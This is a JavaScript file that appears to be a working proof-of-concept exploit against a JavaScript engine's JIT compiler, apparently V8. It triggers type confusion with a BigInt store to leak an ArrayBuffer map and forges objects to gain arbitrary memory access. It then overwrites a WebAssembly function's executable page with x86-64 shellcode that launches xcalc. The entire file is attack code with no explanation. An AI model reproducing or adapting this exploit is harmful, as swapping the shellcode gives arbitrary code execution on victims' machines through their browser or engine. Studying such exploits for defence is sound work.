var lk=[];
let tt = "123"
print = console.log;
// print = alert;

function test() {
    var wasmImports = {
        env: {
            puts: function puts (index) {
                print(utf8ToString(h, index));
            }
        }
    };
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
        96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
        116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
        131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
        109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
        128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
        65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.hello;
}

get_pwnd = test();

let _dv = new DataView(new ArrayBuffer(0x10));

function rd(s, o) {
    for (let i = 0; i < 4; i++) {
        _dv.setUint16(i * 2, String.prototype.charCodeAt.call(s, o + i), true);
    }
    return _dv.getFloat64(0, true);
}

function d2i(d) {
    _dv.setFloat64(0, d, true);
    let lo = _dv.getUint32(0, true);
    let hi = _dv.getUint32(4, true);
    return hi * 0x100000000 + lo;
}

function da(d, k) {
    _dv.setFloat64(0, d, true);
    _dv.setUint32(0, _dv.getUint32(0, true) + k, true);
    return _dv.getFloat64(0, true);
}

function f(t) {
    let a = [1.5, 2, 1337, t];

  let B = {
    "a":1.1,
    "b":1.1,
    "c":1.1,
    "d":1.1,
    "e":1.1,
    "f":1.1,
    "g":1.1,
    "h":1.1,
    "i":1.1,
    "j":1.1,
    "k":1.1,

}
a.a=B;
    a[4] =1n;

    return a;
}



let ab_map = null;
while (1) {
    let a = f(0);
    if (typeof(a) == "string") {

        ab_map = rd(a, 8);

        break;

    }
}


let g = new Function('t', `
    let a = new Array(4);
    a.a = a;
    a.b=t;
    a[0] = 1.1;
    a[4] = ${ab_map};
	let ab = new ArrayBuffer(139);
	lk[0]=ab;
    return a;
`);


let q = null;
for(var i=0; i < 0x10000; i++)
  g(1);
q=g(get_pwnd);
let h=q.e;
let vd = new DataView(lk[0]);
let gd = function(a) {
    
    return vd.getFloat64(0, true);
}
q.k=h;

q.k = da(q.k, 23);
q.k=gd(q.k);

q.k = da(q.k, 7);
q.k=gd(q.k);

q.k = da(q.k, 15);
q.k=gd(q.k);

q.k = da(q.k, 0x87);
q.k=gd(q.k);
let shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
for (let i = 0; i < shellcode.length; i++) {
    vd.setUint8(i, shellcode[i]);
}

get_pwnd();
